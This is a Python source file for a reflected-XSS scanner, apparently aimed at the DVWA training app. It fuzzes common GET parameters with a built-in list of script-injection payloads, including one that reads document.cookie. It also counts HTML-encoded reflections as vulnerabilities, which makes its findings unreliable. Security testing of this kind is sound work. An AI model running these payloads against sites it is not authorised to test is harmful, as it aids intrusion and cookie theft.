import requests
from urllib.parse import urljoin, urlparse, urlunparse
from bs4 import BeautifulSoup
import re


class XSScanner:
    def __init__(self, url, args, session=None):
        self.url = url
        self.args = args
        self.session = session if session else requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
        })

        if args.proxy:
            self.session.proxies = {'http': args.proxy, 'https': args.proxy}

        self.payloads = self.load_payloads()
        self.results = []

    def load_payloads(self):
        payload_file = 'payloads/xss.txt'
        try:
            with open(payload_file, 'r') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            return [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "\"><script>alert(1)</script>",
                "'><svg onload=alert(1)>",
                "<script>alert(document.cookie)</script>",
                "%3Cscript%3Ealert(1)%3C/script%3E",
                "<ScRiPt>alert(1)</ScRiPt>",
                "\" autofocus onfocus=alert(1) x=\"",
                "';alert(1);//",
                "</script><script>alert(1)</script>",
                "<details open ontoggle=alert(1)>"
            ]

    def extract_forms(self, html, base_url):
        soup = BeautifulSoup(html, 'html.parser')
        forms = []

        for form in soup.find_all('form'):
            action = form.get('action', '')
            if not action or action == '#':
                action = base_url
            else:
                action = urljoin(base_url, action)

            method = form.get('method', 'get').lower()
            inputs = []

            for input_tag in form.find_all(['input', 'textarea', 'select']):
                name = input_tag.get('name')
                if name:
                    input_type = input_tag.get('type', 'text')
                    if input_type not in ['submit', 'button', 'image']:
                        inputs.append(name)

            forms.append({
                'action': action,
                'method': method,
                'inputs': inputs
            })

        return forms

    def extract_url_params(self):
        """Extract URL parameters — plus common ones for DVWA."""
        parsed = urlparse(self.url)
        params = set()

        # From actual URL query string
        if parsed.query:
            for param in parsed.query.split('&'):
                if '=' in param:
                    params.add(param.split('=')[0])

        # Common parameters to test for XSS (DVWA uses 'name' for reflected XSS)
        common_xss_params = ['name', 'id', 'page', 'message', 'search', 'q',
                            's', 'cat', 'user', 'username', 'comment',
                            'title', 'text', 'msg', 'error', 'redirect']

        if not params:
            # No URL params found — use common ones
            params.update(common_xss_params)
        else:
            # Also add common ones that might not be in URL
            for cp in common_xss_params:
                if cp not in params:
                    params.add(cp)

        return list(params)

    def test_reflected_xss(self, url, params, payload):
        """Test for reflected XSS in GET parameters"""
        try:
            test_params = {}
            for param in params:
                test_params[param] = payload

            response = self.session.get(url, params=test_params, timeout=self.args.timeout)

            # Check if payload is reflected in the response
            # Try various encodings
            to_check = [
                payload,  # Raw
                payload.replace('<', '&lt;').replace('>', '&gt;'),  # HTML encoded
            ]

            for check in to_check:
                if check and check in response.text:
                    return {
                        'url': url,
                        'param': ', '.join(params),
                        'payload': payload,
                        'type': 'Reflected XSS (GET)',
                        'evidence': payload[:100]
                    }
        except Exception:
            pass
        return None

    def scan(self):
        print("    [*] Crawling target for forms and parameters...")

        try:
            response = self.session.get(self.url, timeout=self.args.timeout)
        except Exception as e:
            print(f"    [!] Error fetching target: {e}")
            return []

        # Get forms
        forms = self.extract_forms(response.text, self.url)
        print(f"    [*] Found {len(forms)} forms")

        # Get URL parameters (including common ones for DVWA)
        url_params = self.extract_url_params()
        print(f"    [*] Testing {len(self.payloads)} XSS payloads on {len(url_params)} parameters...")

        found_any = False

        # Test 1: Direct GET parameters (catches DVWA reflected XSS on ?name=)
        for payload in self.payloads:
            result = self.test_reflected_xss(self.url, url_params, payload)
            if result:
                self.results.append(result)
                print(f"    [!] XSS Found via GET: {payload[:50]}")
                found_any = True
                break  # Found one, stop testing more payloads

        if not found_any:
            print("    [+] No XSS vulnerabilities detected")

        return self.results